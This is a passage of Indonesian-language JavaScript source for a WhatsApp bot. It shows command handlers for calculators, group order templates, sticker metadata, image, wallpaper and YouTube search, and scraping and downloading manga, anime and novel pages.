if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
let media = await Tan.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
updateResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
reply(`Sukses update respon list dengan key *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
reply(`Sukses update respon list dengan key *${args1}*`)
}
break
case 'tambah':{
if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
if (!text.includes('+')) return reply(`Gunakan dengan cara ${prefix+command} *angka* + *angka*\n\n_Contoh_\n\n${prefix+command} 1+2`)
arg = args.join(' ')
atas = arg.split('+')[0]
bawah = arg.split('+')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one + nilai_two}`)}
break
case 'kurang':{
if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
if (!text.includes('-')) return reply(`Gunakan dengan cara ${prefix+command} *angka* - *angka*\n\n_Contoh_\n\n${prefix+command} 1-2`)
arg = args.join(' ')
atas = arg.split('-')[0]
bawah = arg.split('-')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one - nilai_two}`)}
break
case 'kali':{
if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
if (!text.includes('*')) return reply(`Gunakan dengan cara ${prefix+command} *angka* * *angka*\n\n_Contoh_\n\n${prefix+command} 1*2`)
arg = args.join(' ')
atas = arg.split('*')[0]
bawah = arg.split('*')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one * nilai_two}`)}
break
case 'bagi':{
if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
if (!text.includes('/')) return reply(`Gunakan dengan cara ${prefix+command} *angka* / *angka*\n\n_Contoh_\n\n${prefix+command} 1/2`)
arg = args.join(' ')
atas = arg.split('/')[0]
bawah = arg.split('/')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one / nilai_two}`)}
break
case 'setproses': case 'setp':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetProses(m.chat, set_proses)) return reply(`Set proses already active`)
addSetProses(text, m.chat, set_proses)
reply(`✅ Done set proses!`)
break
case 'changeproses': case 'changep':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetProses(m.chat, set_proses)) {
changeSetProses(text, m.chat, set_proses)
reply(`Sukses ubah set proses!`)
} else {
addSetProses(text, m.chat, set_proses)
reply(`Sukses ubah set proses!`)
}
break
case 'delsetproses': case 'delsetp':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!isSetProses(m.chat, set_proses)) return reply(`Belum ada set proses di gc ini`)
removeSetProses(m.chat, set_proses)
reply(`Sukses delete set proses`)
break
case 'setdone':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetDone(m.chat, set_done)) return reply(`Udh set done sebelumnya`)
addSetDone(text, m.chat, set_done)
reply(`Sukses set done!`)
break
}
case 'changedone': case 'changed':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetDone(m.chat, set_done)) {
changeSetDone(text, m.chat, set_done)
reply(`Sukses ubah set done!`)
} else {
addSetDone(text, m.chat, set_done)
reply(`Sukses ubah set done!`)
}
break
case 'delsetdone': case 'delsetd':
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!isSetDone(m.chat, set_done)) return reply(`Belum ada set done di gc ini`)
removeSetDone(m.chat, set_done)
reply(`Sukses delete set done`)
break
case "welcome": 
{
if (!isTanOwner) return reply('*khusus Premium*')
if (!m.isGroup) return reply('Buat Di Group Bodoh')
await loading()
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return reply('Sudah Aktif')
wlcm.push(from)
var groupe = await Tan.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Tan.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted: fcall })
} else if (args[0] === "off") {
if (!welcm) return reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
reply('Sukses Mematikan Welcome  di group ini')
}
}
break
case "gptimg":
let gg = `fitur ini membutuhkan apikey masukkan apikey di file Szhizuka.js dan masukkan di case 'gptimg'`
reply(gg)
break
//=========================================\\	
// case 'gptimg':
// case 'bingimg': {
// if (!isPrem) return replyprem(mess.premium)
// if (!text) return reply('Mana Promt Nya Bos...')
// 	try {
// 	  replyTan(`Sedang Proses Permintaan...`)
//   let ini = await fetchJson(`masukkan apikey mu disini`);
// for (let bing of ini.result) {
// await sleep(500)
// await Tan.sendMessage(m.chat, { image: { url: bing }, caption: ``}, { quoted: fcall })
// Tan.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
// }
// } catch (e) {
// Tan.sendMessage(m.chat, { react: { text: `✖️`, key: m.key }})
// }
// }
// break
//=========================================\\	
case 'smeta': {
if (!/webp/.test(mime)) return replyTan('Reply sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                        //let img = await q.download()
                            let img = await Tan.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) return replyTan('Reply a sticker!')
                                    var stiker = await addExifAvatar(img, `Made by`, `Cheems Bot`)
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) Tan.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else return replyTan('reply sticker')
                                                                              }
                                                                              }       
                                                                              break
			case 'gimage': {
if (!text) return replyTan(`Example : ${prefix + command} carry minati`)
replyTan(`Sedang Proses Permintaan...`)
let ini = await fetchJson(`https://aemt.me/googleimage?query=${q}`);
try{
for (let bing of ini.result) {
await sleep(500)
await Tan.sendMessage(m.chat, { image: { url: bing }, caption: ``}, { quoted: fcall })
Tan.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}
} catch (e) {
Tan.sendMessage(m.chat, { react: { text: `✖️`, key: m.key }})
}
}
        break

case 'mf': {
const mediafireDownload = require('./lib/mdf');
    if (args.length === 0) return reply(`Contoh: ${prefix + command} <link MediaFire>`);

    // Mendapatkan URL MediaFire dari input
    const mediafireUrl = args[0];

    try {
        let res = await mediafireDownload(mediafireUrl);

        // Mengirim informasi file dan link unduhan ke pengguna
        reply(`✅ Download Sukses!\n\n📄 Nama File: ${res.fileName}\n📦 Ukuran: ${res.fileSize}\n🔗 Link Unduhan: ${res.downloadLink}`);
    } catch (error) {
        // Menampilkan pesan error jika terjadi kesalahan
        reply(`⚠️ Terjadi kesalahan saat mengambil file dari MediaFire: ${error}`);
    }
}
break;			
case 'wallpaperdl': {
  if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
  if (!text) {
    return reply(`Silakan masukkan link detail wallpaper yang valid. Contoh: ${prefix + command} <link detail wallpaper>`);
  }
  const urlRegex = /(https?:\/\/[^\s]+)/g;
  const match = text.match(urlRegex);

  if (!match || match.length === 0) {
    return reply(`Contoh: ${prefix + command} <link detail wallpaper>`);
  }

  const detailUrl = match[0];

  try {
    reply("Loading...");
    const videoDetails = await downloadVideo(detailUrl);

    if (!videoDetails) {
      return reply("⚠️ Gagal mendapatkan detail video dari link tersebut.");
    }

    const { title, videoUrl } = videoDetails;

    if (!videoUrl) {
      return reply("⚠️ Tidak ada video yang dapat diunduh dari halaman ini.");
    }
    await Tan.sendMessage(m.chat, {
      video: { url: videoUrl },
      caption: `✅ Video berhasil didownload!\n🎬 Judul: ${title || 'Tidak tersedia'}\n🔗 [Link Asli](${detailUrl})`,
      contextInfo: {
        externalAdReply: {
          title: title || "Wallpaper Video",
          body: "Video berhasil diunduh",
          thumbnailUrl: "https://example.com/thumbnail.jpg",
          mediaType: 2,
          sourceUrl: detailUrl,
        },
      },
    });
  } catch (error) {
    console.error("Error downloading video:", error.message);
    reply(`⚠️ Terjadi kesalahan saat mencoba mendownload video: ${error.message}`);
  }
  break;
}
case 'wallpaper': {
  if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
  if (!text) return replyTan(`Example: ${prefix + command} blue archive`);   
  await loading();
  try {
    const results = await wallpapers(text);

    if (!results.length) {
      return replyTan(`No results found for "${text}"`);
    }
    const createImage = async (url) => {
      const { imageMessage } = await generateWAMessageContent({
        image: { url },
      }, {
        upload: Tan.waUploadToServer,
      });
      return imageMessage;
    };
    const cards = await Promise.all(results.slice(0, 10).map(async (wallpaper, index) => ({
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: `*Title*: ${wallpaper.title}\n\n*Detail URL*: ${wallpaper.detailUrl}\n\n*Resolution*: ${wallpaper.resolution || 'Unknown'}`,
        hasMediaAttachment: true,
        imageMessage: await createImage(wallpaper.imageUrl),
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [],
      }),
    })));
    const msg = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.fromObject({
              text: `Hasil pencarian untuk "${text}" (max 10 hasil):`,
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards,
            }),
          }),
        },
      },
    }, { quoted: fcall });

    await Tan.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });

  } catch (error) {
    console.error("Error in wallpaper search:", error.message);
    replyTan("An error occurred while searching for wallpapers. Please try again.");
  }
};
break;
case 'yts':
case 'ytsearch': {
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text) return replyTan(`Example: ${prefix + command} story wa anime`);   
    await loading(); 
    const yts = require("yt-search");
    const search = await yts(text);
    if (!search.all.length) return replyTan(`No results found for "${text}"`);
    const createImage = async (url) => {
        const { imageMessage } = await generateWAMessageContent({
            image: { url }
        }, {
            upload: Tan.waUploadToServer
        });
        return imageMessage;
    };
    const cards = await Promise.all(search.all.slice(0, 10).map(async (video, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `*Title* : ${video.title}\n\n*Url* : ${video.url}\n\n*Duration* : ${video.timestamp}\n\n *Uploaded* : ${video.ago}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(video.thumbnail)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: []
        })
    })));
    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `Hasil pencarian untuk "${text}" (max 10 hasil):`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, { quoted: fcall });
    await Tan.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case 'mangad': {
    if (m.isGroup) { 
        return reply('⚠️ Perintah ini hanya bisa digunakan di *Private Chat*! Silakan kirim pesan langsung ke bot.');
    }
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text) {
        return reply("Masukkan link halaman detail manga yang valid dari Komikcast.");
    }

    async function getMangaDetails(url) {
        try {
            reply("Mengambil data manga, mohon tunggu...");
            const mangaDetails = await detailManga(url);
            return mangaDetails || null;
        } catch (err) {
            console.error(err);
            return null;
        }
    }

    let mangaDetails = await getMangaDetails(text);

    if (!mangaDetails) {
        return reply(`*Gagal mendapatkan data untuk link:* "${text}"`);
    }

    const { title, thumbnail, genres, release, author, status, chapters } = mangaDetails;
    reply(`*Detail Manga*📚\n> Judul: ${title}\n> Genre: ${genres.join(', ')}\n> Rilis: ${release}\n> Penulis: ${author}\n> Status: ${status}`);

    let maxResults = Math.min(chapters.length, 100); 
    let batchSize = 10;

    async function sendBatch(startIndex) {
        let results = chapters.slice(startIndex, startIndex + batchSize);
        let cards = [];

        for (let chapter of results) {

            cards.push({
                header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia(
                        { image: { url: thumbnail } },
                        { upload: Tan.waUploadToServer }
                    )),
                    title: chapter.chapterTitle,
                    subtitle: `Tanggal Rilis: ${chapter.chapterTime}`,
                    hasMediaAttachment: false,
                }),
                body: {
                    text: `> Tanggal Rilis: ${chapter.chapterTime}\n> URL: ${chapter.chapterUrl}`,
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            "name": "quick_reply",
                            "buttonParamsJson": `{"display_text":"Download","id":"mangadl ${chapter.chapterUrl}"}`
                        }
                    ],
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        forwardingScore: 100,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '1@newsletter',
                            newsletterName: ownername,
                            serverMessageId: 143
                        }
                    }
                },
            });
        }

        let pan = `List Chapter ${title}`;
        let msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: {
                                text: pan,
                            },
                            carouselMessage: {
                                cards: cards,
                                messageVersion: 1,
                            },
                        },
                    },
                },
            },
            {}
        );

        await Tan.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id,
        });

        if (startIndex + batchSize < maxResults) {
            setTimeout(() => sendBatch(startIndex + batchSize), 2000);
        }
    }

    await sendBatch(0);
    break;
}
case 'mangadl': {
    if (m.isGroup) { 
        return reply('⚠️ Perintah ini hanya bisa digunakan di *Private Chat*! Silakan kirim pesan langsung ke bot.');
    }
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text) {
        return replyTan(`Contoh: ${prefix + command} <link Komikcast>`);
    }
    const urlRegex = /(https?:\/\/(?:www\.)?komikcast01\.com\/[^\s]+)/g;
    const match = text.match(urlRegex);
    if (!match || match.length === 0) {
        return replyTan(`⚠️ Silakan masukkan link Komikcast yang valid. Contoh: ${prefix + command} <link Komikcast>`);
    }
    const komikUrl = match[0]; 
    console.log("Received URL for mangadl:", komikUrl);

    await loading();
    try {
        const pdfPath = await dlManga(komikUrl); 
        if (!pdfPath) {
            return replyTan('⚠️ Gagal membuat PDF dari manga.');
        }
        await Tan.sendMessage(
            m.chat,
            {
                document: { url: pdfPath, mimetype: 'application/pdf' },
                fileName: `Manga-${Date.now()}.pdf`,
            },
            { quoted: m }
        );
        fs.unlinkSync(pdfPath);
        replyTan('✅ Manga berhasil didownload dan PDF telah dikirim.');
    } catch (error) {
        console.error(error);
        replyTan(`⚠️ Terjadi kesalahan: ${error.message}`);
    }
    break;
}
case 'animes': {
    if (m.isGroup) { 
        return reply('⚠️ Perintah ini hanya bisa digunakan di *Private Chat*! Silakan kirim pesan langsung ke bot.');
    }
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text) return reply(`Example: ${prefix + command} Chuunibyou`);

    await loading();
    const animeResults = await OtakuSearch(text);
    if (!animeResults.length) return reply(`No results found for "${text}"`);

    // Define the createImage function
    const createImage = async (url) => {
        const { imageMessage } = await generateWAMessageContent({
            image: { url }
        }, {
            upload: Tan.waUploadToServer
        });
        return imageMessage;
    };

    const cards = await Promise.all(animeResults.slice(0, 10).map(async (anime) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `> TITLE  :  ${anime.title}\n> URL : ${anime.animeUrl}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(anime.imageUrl) // Use the createImage function here
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [
                {
                    name: "quick_reply",
                    buttonParamsJson: `{"display_text":"Get Details","id":"animed ${anime.animeUrl}"}`
                }
            ]
        })
    })));

    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `Result for "${text}"`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, { quoted: fcall });

    await Tan.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
    break;
}
case 'animed': {
    if (m.isGroup) { 
        return reply('⚠️ Perintah ini hanya bisa digunakan di *Private Chat*! Silakan kirim pesan langsung ke bot.');
    }
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text) {
        return reply("Masukkan link halaman detail anime yang valid.");
    }

    async function getAnimeDetails(url) {
        try {
            reply("Mengambil data anime, mohon tunggu...");
            const animeDetails = await OtakuDetail(url);
            return animeDetails || null;
        } catch (err) {
            console.error(err);
            return null;
        }
    }

    let animeDetails = await getAnimeDetails(text);

    if (!animeDetails) {
        return reply(`*Gagal mendapatkan data untuk link:* "${text}"`);
    }

    const { 
        title, 
        japaneseTitle, 
        score, 
        producer, 
        type, 
        status, 
        totalEpisodes, 
        duration, 
        releaseDate, 
        studio, 
        genres, 
        synopsis, 
        episodeLinks, 
        thumbnail 
    } = animeDetails;

    reply(`📺 *Detail Anime*\n\n`
        + `*Judul:* ${title}\n`
        + `*Judul Jepang:* ${japaneseTitle}\n`
        + `*Skor:* ${score}\n`
        + `*Produser:* ${producer}\n`
        + `*Tipe:* ${type}\n`
        + `*Status:* ${status}\n`
        + `*Total Episode:* ${totalEpisodes}\n`
        + `*Durasi:* ${duration}\n`
        + `*Tanggal Rilis:* ${releaseDate}\n`
        + `*Studio:* ${studio}\n`
        + `*Genre:* ${genres}\n\n`
        + `📖 *Sinopsis:*\n${synopsis}\n\n`);

    let cards = [];

    for (let i = 0; i < Math.min(episodeLinks.length, 100000); i++) {
        cards.push({
            header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia(
                    { image: { url: thumbnail } },
                    { upload: Tan.waUploadToServer }
                )),
                title: `Episode ${i + 1}`,
                subtitle: `Tonton sekarang`,
                hasMediaAttachment: false,
            }),
            body: {
                text: `> URL: ${episodeLinks[i]}`,
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        "name": "quick_reply",
                        "buttonParamsJson": `{"display_text":"Tonton","id":"animedl ${episodeLinks[i]}"}`,
                    }
                ],
                contextInfo: {
                    mentionedJid: [m.sender], 
                    forwardingScore: 100,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '1@newsletter',
                        newsletterName: ownername,
                        serverMessageId: 143
                    }
                }
            },
        });
    }

    let pan = `List Episode ${title}`;
    let msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: pan,
                        },
                        carouselMessage: {
                            cards: cards,
                            messageVersion: 1,
                        },
                    },
                },
            },
        },
        {}
    );

    await Tan.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id,
    });

    break;
}
case 'animedl': {
  if (m.isGroup) { 
        return reply('⚠️ Perintah ini hanya bisa digunakan di *Private Chat*! Silakan kirim pesan langsung ke bot.');
    }
  if (!text) {
    return reply("Masukkan link halaman detail anime yang valid dari OtakuDesu.");
  }

  async function getAnimeDetails(url) {
    try {
      reply("Mengambil data anime, mohon tunggu...");
      const animeDetails = await OtakuDl(url);
      return animeDetails || null;
    } catch (err) {
      console.error(err);
      return null;
    }
  }

  let animeDetails = await getAnimeDetails(text);

  if (!animeDetails) {
    return reply(`*Gagal mendapatkan data untuk link:* "${text}"`);
  }
  const { title, episodeUrl, thumbnailUrl, streamingUrl, downloadLinks } = animeDetails;
  const validThumbnailUrl = thumbnailUrl && typeof thumbnailUrl === 'string' 
    ? thumbnailUrl 
    : "https://g.top4top.io/p_3315mdtvp0.jpeg";
  const streamingText = streamingUrl 
    ? `> LINK STREAMING`
    : "*Streaming:* Tidak tersedia";
  try {
    let mediaMessage = await prepareWAMessageMedia(
      { image: { url: validThumbnailUrl } }, 
      { upload: Tan.waUploadToServer }
    );

    let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              carouselMessage: {
                cards: [
                  {
                    header: proto.Message.InteractiveMessage.Header.create({
                      ...mediaMessage,
                      subtitle: "Klik tombol di bawah untuk streaming",
                      hasMediaAttachment: false,
                    }),
                    body: { text: streamingText },
                    nativeFlowMessage: {
                      buttons: streamingUrl ? [
                        {
                          name: "cta_url",
                          buttonParamsJson: `{"display_text":"▶️ Tonton Sekarang","url":"${streamingUrl}"}`,
                        },
                      ] : [],
                    },
                  },
                ],
                messageVersion: 1,
              },
            },
          },
        },
      },
      {}
    );

    await Tan.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
  } catch (error) {
    console.error("Error preparing media message:", error);
    reply("⚠️ Gagal memuat thumbnail, tetapi detail anime tetap tersedia.");
  }
  let downloadText = `> ${title}`;
  Object.keys(downloadLinks).forEach(resolution => {
    if (downloadLinks[resolution].length > 0) {
      downloadText += `\n\n*Resolusi ${resolution}*\n`;
      downloadLinks[resolution].forEach(({ provider, link }) => {
        downloadText += `*${provider}* ${link}\n`;
      });
      downloadText += "\n";
    }
  });

  reply(downloadText);
  break;
}
case 'mangas': {
    if (m.isGroup) { 
        return reply('⚠️ Perintah ini hanya bisa digunakan di *Private Chat*! Silakan kirim pesan langsung ke bot.');
    }
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text) return replyTan(`Example: ${prefix + command} Naruto`);   
    await loading(); 
    const mangaResults = await searchManga(text);
    if (!mangaResults.length) return replyTan(`No results found for "${text}"`);
    const createImage = async (url) => {
        const { imageMessage } = await generateWAMessageContent({
            image: { url }
        }, {
            upload: Tan.waUploadToServer
        });
        return imageMessage;
    };
    const cards = await Promise.all(mangaResults.slice(0, 10).map(async (manga) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `> TITLE  :  ${manga.title}\n> URL : ${manga.url}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(manga.thumbnail)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [
                {
                    name: "quick_reply",
                    buttonParamsJson: `{"display_text":"Get Chapter","id":"mangad ${manga.url}"}`
                }
            ]
        })
    })));

    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `Result for "${text}"`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, { quoted: fcall });

    await Tan.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
    break;
}

case 'novels' : 
case 'novelsearch': {
    if (m.isGroup) { 
        return reply('⚠️ Perintah ini hanya bisa digunakan di *Private Chat*! Silakan kirim pesan langsung ke bot.');
    }
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text) return replyTan(`Example: ${prefix + command} Judul Novel`);   
    await loading(); 
    const novelResults = await searchNovel(text);
    if (!novelResults.length) return replyTan(`No results found for "${text}"`);

    const createImage = async (url) => {
        const { imageMessage } = await generateWAMessageContent({
            image: { url }
        }, {
            upload: Tan.waUploadToServer
        });
        return imageMessage;
    };

    const cards = await Promise.all(novelResults.slice(0, 10).map(async (novel) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `> TITLE  :  ${novel.title}\n> URL : ${novel.url}\n> WARNING: ${novel.warning || 'No adult content'}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(novel.imgUrl)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [
                {
                    name: "quick_reply",
                    buttonParamsJson: `{"display_text":"📖 Read Novel","id":"noveld ${novel.url}"}`
                }
            ]
        })
    })));

    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `Results for "${text}":`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, { quoted: fcall });

    await Tan.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
    break;
}
case 'noveld': {
    if (m.isGroup) { 
        return reply('⚠️ Perintah ini hanya bisa digunakan di *Private Chat*! Silakan kirim pesan langsung ke bot.');
    }
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text) {
        return reply("Masukkan link halaman detail novel yang valid dari Sakuranovel.");
    }
    await loading()
    const headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Cache-Control": "no-cache",
        Pragma: "no-cache",
    };

    try {
        const response = await axios.get(text, { headers });
        const html = response.data;
        const $ = cheerio.load(html);

        const title = $(".series-titlex h2").text().trim();
        const alternativeTitle = $(".series-titlex span").text().trim();
        const status = $(".series-infoz.block .status").text().trim();
        const type = $(".series-infoz.block .type").text().trim();
        const rating = $(".series-infoz.score span[itemprop='ratingValue']").text().trim();
        const bookmarkCount = $(".favcount span").text().trim();
        const country = $(".series-infolist li:contains('Country') span a").text().trim();
        const published = $(".series-infolist li:contains('Published') span").text().trim();
        const author = $(".series-infolist li:contains('Author') span").text().trim();
        const totalChapters = $(".series-infolist li:contains('Total Chapter') span").text().trim();
        
        const tags = [];
        $(".series-infolist li:contains('Tags') span a").each((_, el) => {
            tags.push($(el).text().trim());
        });

        const genres = [];
        $(".series-genres a").each((_, el) => {
            genres.push($(el).text().trim());
        });

        const synopsis = $(".series-synops").text().trim();
        const thumbnail = $(".summary_image img").attr("src") || '';

        const chapters = [];
        $(".series-chapterlists li").each((_, el) => {
            const chapterTitle = $(el).find(".flexch-infoz a").attr("title")?.trim() || "Tidak ada judul";
            const chapterUrl = $(el).find(".flexch-infoz a").attr("href")?.trim() || "#";
            const chapterDate = $(el).find(".flexch-infoz a span.date").text().trim() || "Tidak diketahui";
            if (chapterUrl !== "#") {
                chapters.push({ chapterTitle, chapterUrl, chapterDate });
            }
        });

        if (chapters.length === 0) {
            return reply("⚠️ Gagal mengambil daftar chapter.");
        }

        reply(`*📖 Detail Novel*\n\n📌 *Judul:* ${title}\n📚 *Alternatif:* ${alternativeTitle || "Tidak tersedia"}\n📝 *Penulis:* ${author || "Tidak diketahui"}\n📅 *Status:* ${status || "Tidak diketahui"}\n🌟 *Rating:* ${rating || "Tidak ada"} ⭐\n📌 *Genre:* ${genres.join(", ") || "Tidak diketahui"}\n🏷️ *Tags:* ${tags.join(", ") || "Tidak diketahui"}\n📖 *Sinopsis:* ${synopsis || "Tidak ada sinopsis tersedia."}`);

        let maxResults = Math.min(chapters.length, 100);
        let batchSize = 10;

        async function sendBatch(startIndex) {
            let results = chapters.slice(startIndex, startIndex + batchSize);
            let cards = [];

            for (let chapter of results) {
                cards.push({
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia(
                            { image: { url: thumbnail } },
                            { upload: Tan.waUploadToServer }
                        )),
                        title: chapter.chapterTitle,
                        subtitle: `Tanggal Rilis: ${chapter.chapterDate}`,
                        hasMediaAttachment: false,
